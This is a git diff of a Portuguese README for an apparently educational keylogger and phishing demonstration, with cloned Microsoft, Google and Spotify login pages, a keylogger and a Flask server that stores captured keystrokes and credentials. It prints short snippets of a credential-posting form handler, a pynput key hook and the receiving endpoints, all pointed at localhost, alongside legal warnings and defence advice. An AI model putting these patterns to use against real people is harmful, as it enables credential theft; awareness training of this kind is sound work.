@@ -1,327 +1,411 @@
-# 🔐 Keylogger Browser-Based - Demonstração Educacional
+# 🔐 Keylogger Educacional - Demonstração Check Point
 
-<div align="center">
-
-[![License:  MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
-[![Python 3.11+](https://img.shields.io/badge/python-3.11+-blue.svg)](https://www.python.org/downloads/)
-[![Flask](https://img.shields.io/badge/Flask-2.0+-green.svg)](https://flask.palletsprojects.com/)
-[![JavaScript](https://img.shields.io/badge/JavaScript-ES6+-yellow.svg)](https://www.javascript.com/)
-
-**Sistema de demonstração de técnicas de phishing e keylogger client-side para fins educacionais**
-
-[Sobre](#-sobre-o-projeto) •
-[Templates](#-templates-de-phishing) •
-[Instalação](#-instalação-rápida) •
-[Segurança](#️-segurança) •
-[Docs](#-documentação-técnica)
-
-</div>
-
----
-
-## ⚠️ AVISO IMPORTANTE
-
-> **Este projeto é exclusivamente educacional.** O uso inadequado pode violar a LGPD e o Código Penal Brasileiro. 
-> 
-> **Use APENAS com consentimento explícito e em ambiente isolado (localhost).**
-
----
+![Python Version](https://img.shields.io/badge/python-3.8%2B-blue)
+![License](https://img.shields.io/badge/license-MIT-green)
+![Status](https://img.shields.io/badge/status-educational-orange)
+![Platform](https://img.shields.io/badge/platform-Windows%20%7C%20Linux%20%7C%20MacOS-lightgrey)
 
 ## 📋 Sobre o Projeto
 
-Sistema de demonstração de **keylogger JavaScript** que captura interações em páginas web falsas (phishing) e envia automaticamente para um servidor backend.
+Este projeto foi desenvolvido exclusivamente para **fins educacionais e de demonstração** como parte de uma apresentação sobre segurança cibernética para a Check Point. O objetivo é demonstrar como ataques de phishing e keylogging funcionam, aumentando a conscientização sobre essas ameaças.
 
-### O que você vai aprender:
+### ⚠️ AVISO IMPORTANTE
 
-- ✅ Como keyloggers client-side capturam dados no navegador
-- ✅ Técnicas de phishing com templates pixel-perfect
-- ✅ Fluxo de captura e exfiltração de credenciais
-- ✅ Como se defender contra estes ataques
+**Este projeto é apenas para fins educacionais!** O uso deste software para atividades maliciosas é **ILEGAL** e **ANTIÉTICO**. O desenvolvedor não se responsabiliza por qualquer uso indevido desta ferramenta.
 
----
+## 🏗️ Arquitetura do Sistema
 
-## 🏗️ Arquitetura
+O projeto consiste em três componentes principais:
 
 ```
-┌─────────────────────────────────────────┐
-│  FRONTEND (JavaScript)                   │
-│  • Templates:  Microsoft/Google/Spotify   │
-│  • keylogger-client.js                   │
-│    → Captura teclas/cliques              │
-│    → Buffer inteligente (10/5s)          │
-│    → Envio automático via fetch()        │
-└──────────────┬──────────────────────────┘
-               │
-               │ POST /api/salvar-client
-               │
-┌──────────────▼──────────────────────────┐
-│  BACKEND (Flask/Python)                  │
-│  • Recebe dados capturados               │
-│  • Valida e salva em JSON                │
-└──────────────────────────────────────────┘
+┌─────────────────┐         ┌─────────────────┐         ┌─────────────────┐
+│                 │         │                 │         │                 │
+│  Página Phishing│────────▶│   Keylogger     │────────▶│  Servidor API   │
+│   (Frontend)    │         │    (Cliente)    │         │   (Backend)     │
+│                 │         │                 │         │                 │
+└─────────────────┘         └─────────────────┘         └─────────────────┘
+       HTML/CSS/JS              Python Script             Flask API
 ```
 
----
+### Componentes:
+
+1. **Páginas de Phishing**: Templates HTML que simulam páginas de login conhecidas
+2. **Keylogger**: Script Python que captura teclas pressionadas
+3. **Servidor API**: Backend Flask que recebe e armazena os dados capturados
 
 ## 🎭 Templates de Phishing
 
-O projeto inclui **3 templates pixel-perfect** de páginas de login reais.
+O projeto inclui três templates profissionais de phishing para demonstração:
 
-| Template | Fidelidade | Características |
-|----------|-----------|-----------------|
-| **Microsoft** | 98% | 3 etapas, design oficial, animações |
-| **Google** | 95% | 2 etapas, validação visual |
-| **Spotify** | 97% | Dark mode, botões sociais |
+### 📧 Template Microsoft
+![Microsoft Template](assets/Microsoft%20Template.png)
+*Template que simula a página de login da Microsoft 365*
 
----
+### 🔍 Template Google
+![Google Template](assets/Google%20Template.png)
+*Template que simula a página de login do Google*
 
-## 🚀 Instalação Rápida
+### 🎵 Template Spotify
+![Spotify Template](assets/Spotify%20Template.png)
+*Template que simula a página de login do Spotify*
 
-### 1. Clone e Configure
+## 🚀 Instalação
+
+### Pré-requisitos
+
+- Python 3.8 ou superior
+- pip (gerenciador de pacotes Python)
+- Navegador web moderno
+
+### Passo 1: Clone o Repositório
 
 ```bash
 git clone https://github.com/duarteHiago/keylogger-apresentacao-chkp-.git
 cd keylogger-apresentacao-chkp-
+```
 
-# Crie ambiente virtual
-python -m venv .venv
-.\.venv\Scripts\Activate.ps1  # Windows
-# source .venv/bin/activate    # Linux/Mac
+### Passo 2: Instale as Dependências
 
-# Instale dependências
-cd backend
+```bash
 pip install -r requirements.txt
 ```
 
-### 2. Inicie o Servidor
+#### Dependências necessárias:
+- `pynput`: Para captura de teclas
+- `flask`: Framework web para o servidor API
+- `flask-cors`: Para permitir requisições cross-origin
+- `requests`: Para envio de dados HTTP
 
-```powershell
-cd backend
+### Passo 3: Configure o Servidor
+
+Edite o arquivo `keylogger.py` e configure o endereço do servidor:
+
+```python
+SERVER_URL = "http://localhost:5000/api/keylog"
+```
+
+### Passo 4: Inicie o Servidor API
+
+```bash
 python server.py
 ```
 
-✅ **Servidor rodando em:** `http://localhost:5000`
+O servidor estará disponível em `http://localhost:5000`
 
-### 3. Abra um Template
+### Passo 5: Execute o Keylogger (Apenas para Demonstração)
 
-```powershell
-# Microsoft
-cd ..\frontend\cadastro\templates\microsoft
-start index.html
-
-# OU Google
-cd ..\frontend\cadastro\templates\google
-start index.html
-
-# OU Spotify
-cd ..\frontend\cadastro\templates\spotify
-start index.html
+```bash
+python keylogger.py
 ```
 
-### 4. Teste e Observe
+### Passo 6: Abra a Página de Phishing
 
-1. Digite credenciais fictícias na página
-2. Pressione `F12` (DevTools) → aba **Console**
-3. Veja os logs do keylogger em ação
-4. Verifique `backend/client_logs.json` para ver dados capturados
+Abra qualquer um dos arquivos HTML no navegador:
+- `microsoft-phishing.html`
+- `google-phishing.html`
+- `spotify-phishing.html`
 
----
+## 🔍 Como Funciona
 
-## 📊 Como Funciona
+### 1. Página de Phishing
 
-```
-Usuário digita → keylogger captura → buffer acumula → 
-→ (10 eventos OU 5s) → POST para backend → salva em JSON
-```
+As páginas de phishing são réplicas visuais de páginas legítimas de login. Quando a vítima insere credenciais:
 
-### Dados Capturados
-
-```json
-{
-  "tipo": "keypress",
-  "tecla": "a",
-  "campo": "email",
-  "timestamp": "2025-12-17T10:30:00.123Z",
-  "url": "http://localhost/google/index.html",
-  "sessionId": "session_1734480001_abc123"
-}
+```javascript
+// Captura o formulário
+form.addEventListener('submit', function(e) {
+    e.preventDefault();
+    // Envia dados para o servidor
+    fetch('http://localhost:5000/api/credentials', {
+        method: 'POST',
+        body: JSON.stringify(credentials)
+    });
+});
 ```
 
----
+### 2. Keylogger
 
-## 🛡️ Segurança
+O keylogger captura cada tecla pressionada e envia para o servidor:
 
-### Cenário de Ataque Real
+```python
+from pynput import keyboard
 
-<div align="center">
-
-```
-1. Atacante registra domínio similar
-   ❌ googIe.com (I maiúsculo)
-   
-2. Hospeda template idêntico + keylogger
-   
-3. Envia email de phishing em massa
-   📧 "Sua conta será suspensa!"
-   
-4. Vítima digita credenciais reais
-   
-5. Keylogger captura TUDO em tempo real
-   
-6. Dados enviados ao servidor do atacante
-   💀 Email + Senha comprometidos
+def on_press(key):
+    try:
+        # Captura a tecla
+        key_data = str(key.char)
+        # Envia para o servidor
+        send_to_server(key_data)
+    except AttributeError:
+        # Teclas especiais
+        key_data = str(key)
 ```
 
-</div>
+### 3. Servidor API
 
-### Como Se Proteger
+O servidor recebe e armazena os dados:
 
-#### Para Usuários:
+```python
+@app.route('/api/keylog', methods=['POST'])
+def receive_keylog():
+    data = request.json
+    # Salva os dados
+    save_to_file(data)
+    return jsonify({'status': 'success'})
+```
 
-| ✅ FAÇA | ❌ NÃO FAÇA |
-|---------|-------------|
-| Verifique sempre a URL (HTTPS + domínio correto) | Confie apenas no visual da página |
-| Use gerenciador de senhas | Digite senhas manualmente em sites suspeitos |
-| Habilite 2FA | Clique em links de emails urgentes |
+## 🛡️ Segurança e Proteção
 
-#### Para Organizações:
+### Como se Proteger Contra Essas Ameaças
 
-- ✅ **EDR/XDR**: Harmony Endpoint, CrowdStrike, SentinelOne
-- ✅ **URL Filtering**: Bloqueia domínios maliciosos
-- ✅ **Zero Phishing**: Detecção de phishing zero-day
-- ✅ **Treinamento**: Simulações periódicas
+![Check Point Harmony](assets/Harmony.png)
 
----
+1. **Use Soluções de Segurança Robustas**
+   - Check Point Harmony Endpoint
+   - Antivírus atualizados
+   - Firewall configurado
 
-## 📂 Estrutura
+2. **Educação e Conscientização**
+   - Verifique sempre a URL do site
+   - Desconfie de e-mails suspeitos
+   - Use autenticação de dois fatores (2FA)
+
+3. **Boas Práticas**
+   - Não instale software de fontes desconhecidas
+   - Mantenha o sistema operacional atualizado
+   - Use senhas fortes e únicas
+   - Utilize gerenciadores de senha
+
+4. **Verificações de Segurança**
+   - Verifique certificados SSL (HTTPS)
+   - Analise o domínio cuidadosamente
+   - Desconfie de urgências artificiais
+
+### Detecção de Phishing
+
+**URLs Legítimas vs Falsas:**
+
+✅ `https://login.microsoft.com`  
+❌ `http://micros0ft-login.com`
+
+✅ `https://accounts.google.com`  
+❌ `http://google-accounts-verify.com`
+
+## 📁 Estrutura do Projeto
 
 ```
 keylogger-apresentacao-chkp-/
 │
-├── frontend/cadastro/
-│   ├── keylogger-client.js      # ⚡ Keylogger JavaScript
-│   └── templates/
-│       ├── microsoft/           # ✅ Template Microsoft
-│       ├── google/              # ✅ Template Google
-│       └── spotify/             # ✅ Template Spotify
+├── assets/                      # Recursos visuais
+│   ├── Microsoft Template.png
+│   ├── Google Template.png
+│   ├── Spotify Template.png
+│   └── Harmony.png
 │
-└── backend/
-    ├── server.py                # 🖥️ API Flask
-    ├── requirements.txt         # Dependências
-    └── client_logs.json         # 📝 Logs (gerado)
+├── templates/                   # Templates de phishing
+│   ├── microsoft-phishing.html
+│   ├── google-phishing.html
+│   └── spotify-phishing.html
+│
+├── keylogger.py                # Script do keylogger
+├── server.py                   # Servidor API Flask
+├── requirements.txt            # Dependências Python
+├── logs/                       # Diretório de logs (criado automaticamente)
+│   ├── keylog.txt
+│   └── credentials.txt
+│
+└── README.md                   # Este arquivo
 ```
 
----
+## 📡 Documentação da API
 
-## 🔌 API
+### Endpoints Disponíveis
 
-```http
-POST /api/salvar-client
-Content-Type: application/json
+#### 1. Receber Keylog
 
-{
-  "sessao": "session_xxx",
-  "dados": [ /* eventos capturados */ ],
-  "navegador": "Mozilla/5.0...",
-  "plataforma": "Win32",
-  "idioma": "pt-BR"
-}
-```
+**POST** `/api/keylog`
 
-**Response:**
 ```json
 {
-  "success": true,
-  "eventos_recebidos": 10,
-  "message": "Dados salvos com sucesso"
+  "key": "a",
+  "timestamp": "2025-12-17T21:21:11Z",
+  "source": "keylogger"
 }
 ```
 
----
+**Resposta:**
+```json
+{
+  "status": "success",
+  "message": "Keylog received"
+}
+```
+
+#### 2. Receber Credenciais
+
+**POST** `/api/credentials`
+
+```json
+{
+  "username": "user@example.com",
+  "password": "password123",
+  "template": "microsoft",
+  "timestamp": "2025-12-17T21:21:11Z"
+}
+```
+
+**Resposta:**
+```json
+{
+  "status": "success",
+  "message": "Credentials received"
+}
+```
+
+#### 3. Obter Logs
+
+**GET** `/api/logs`
+
+**Resposta:**
+```json
+{
+  "keylogs": [...],
+  "credentials": [...]
+}
+```
+
+#### 4. Status do Servidor
+
+**GET** `/api/status`
+
+**Resposta:**
+```json
+{
+  "status": "online",
+  "uptime": 3600,
+  "version": "1.0.0"
+}
+```
 
 ## ⚖️ Aspectos Legais
 
-### 🇧🇷 LGPD + Código Penal
+### Legislação Brasileira
 
-**Uso sem consentimento é:**
-- ⚖️ **ILEGAL** (LGPD Art. 52)
-- ⚖️ **CRIME** (Código Penal Art. 154-A)
-- 💰 Multa até **R$ 50 milhões**
-- 🚔 Prisão de **3 meses a 1 ano**
+O uso não autorizado de keyloggers e phishing é crime no Brasil, previsto em:
 
-### ✅ Uso Educacional Legítimo
+- **Lei Carolina Dieckmann (12.737/2012)**: Invasão de dispositivo informático
+- **Marco Civil da Internet (12.965/2014)**: Proteção de dados e privacidade
+- **LGPD (13.709/2018)**: Lei Geral de Proteção de Dados
 
-```
-✅ Consentimento documentado (TCLE)
-✅ Ambiente isolado (localhost)
-✅ Dados fictícios/anonimizados
-✅ Exclusão após demonstração
-✅ Supervisão acadêmica/institucional
-```
+**Penas:** Reclusão de 3 meses a 1 ano + multa (podendo aumentar conforme agravantes)
 
----
+### Uso Ético
 
-## 🎓 Propósito
+Este projeto deve ser usado **APENAS**:
+- ✅ Em ambientes controlados de teste
+- ✅ Com autorização explícita
+- ✅ Para fins educacionais
+- ✅ Em demonstrações de segurança
 
-Este projeto é para:
-- 🎯 Demonstração em laboratórios de segurança
-- 🔍 Treinamento de awareness em empresas
-- 📖 Material didático para cibersegurança
-- 🛡️ Capacitação de Blue Team e Red Team
+**NUNCA:**
+- ❌ Contra pessoas sem consentimento
+- ❌ Para roubo de informações
+- ❌ Em redes públicas ou corporativas
+- ❌ Com intenção maliciosa
 
----
+## 🔧 Troubleshooting
 
-## 📚 Documentação Técnica
+### Problema: Servidor não inicia
 
-Detalhes aprofundados sobre arquitetura, fluxos, estruturas de dados e extensões:
-
-📖 **[DOCUMENTATION.md](./DOCUMENTATION.md)**
-
----
-
-## 🛠️ Solução de Problemas
-
-```powershell
-# Erro: "No module named 'flask'"
-cd backend
-pip install -r requirements.txt
-
-# Erro: "Porta 5000 em uso"
+**Solução:**
+```bash
+# Verifique se a porta 5000 está disponível
 netstat -ano | findstr :5000
-taskkill /PID <numero> /F
 
-# Keylogger não envia dados
-# → Verifique se servidor Flask está rodando
-# → Abra DevTools (F12) e procure erros no Console
+# Use outra porta se necessário
+python server.py --port 5001
 ```
 
----
+### Problema: Keylogger não captura teclas
 
-## 📄 Licença
+**Solução:**
+- No Windows: Execute como administrador
+- No Linux/Mac: Verifique permissões de acessibilidade
 
-MIT License - Veja [LICENSE](LICENSE) para detalhes.
+### Problema: Erro de CORS no navegador
 
----
+**Solução:**
+Certifique-se de que o Flask-CORS está instalado:
+```bash
+pip install flask-cors
+```
 
-## ⚠️ Disclaimer
+### Problema: Requisitos não instalados
 
-**IMPORTANTE:** Este software é fornecido "como está", sem garantias.
+**Solução:**
+```bash
+pip install --upgrade -r requirements.txt
+```
 
-O uso para capturar dados **sem consentimento explícito** é **ILEGAL** e pode resultar em:
-- Processos criminais (Art. 154-A)
-- Multas da LGPD (até R$ 50 milhões)
-- Responsabilização civil
+## 📚 Recursos Educacionais
 
-**Os autores NÃO se responsabilizam por uso inadequado.**
+### Links Úteis
 
-**Use responsavelmente. Sempre obtenha consentimento explícito.**
+- [Check Point Research](https://research.checkpoint.com/)
+- [OWASP - Phishing](https://owasp.org/www-community/attacks/Phishing)
+- [CERT.br - Cartilha de Segurança](https://cartilha.cert.br/)
+- [NIST Cybersecurity Framework](https://www.nist.gov/cyberframework)
+
+### Treinamentos Recomendados
+
+1. **Check Point Certified Security Administrator (CCSA)**
+2. **Ethical Hacking Courses**
+3. **Security Awareness Training**
+
+## 🤝 Contribuindo
+
+Este é um projeto educacional. Contribuições são bem-vindas desde que mantenham o foco educacional:
+
+1. Fork o projeto
+2. Crie uma branch para sua feature (`git checkout -b feature/AmazingFeature`)
+3. Commit suas mudanças (`git commit -m 'Add some AmazingFeature'`)
+4. Push para a branch (`git push origin feature/AmazingFeature`)
+5. Abra um Pull Request
+
+## 📝 Licença
+
+Este projeto está sob a licença MIT. Veja o arquivo `LICENSE` para mais detalhes.
+
+## 👨‍💻 Autor
+
+**Duarte Hiago**
+- GitHub: [@duarteHiago](https://github.com/duarteHiago)
+- Projeto: Apresentação Check Point - Segurança Cibernética
+
+## 🙏 Agradecimentos
+
+- Check Point Software Technologies pela inspiração
+- Comunidade de segurança cibernética
+- Todos que contribuem para a educação em segurança
+
+## ⚠️ Disclaimer Final
+
+**ESTE SOFTWARE É FORNECIDO "COMO ESTÁ", SEM GARANTIAS DE QUALQUER TIPO, EXPRESSAS OU IMPLÍCITAS.**
+
+O desenvolvedor não se responsabiliza por:
+- Qualquer uso indevido deste software
+- Danos diretos ou indiretos causados pelo uso
+- Violações de leis locais, estaduais ou federais
+- Perda de dados ou violação de privacidade
+
+**USE POR SUA PRÓPRIA CONTA E RISCO E APENAS PARA FINS EDUCACIONAIS LEGÍTIMOS.**
 
 ---
 
 <div align="center">
 
-**Desenvolvido para fins educacionais** 🎓 | **Segurança da Informação** 🔐
+**🔒 Desenvolvido para Educação em Segurança Cibernética 🔒**
 
-[![GitHub](https://img.shields.io/badge/GitHub-duarteHiago-blue?logo=github)](https://github.com/duarteHiago/keylogger-apresentacao-chkp-)
+*"A melhor defesa é o conhecimento"*
 
 </div>
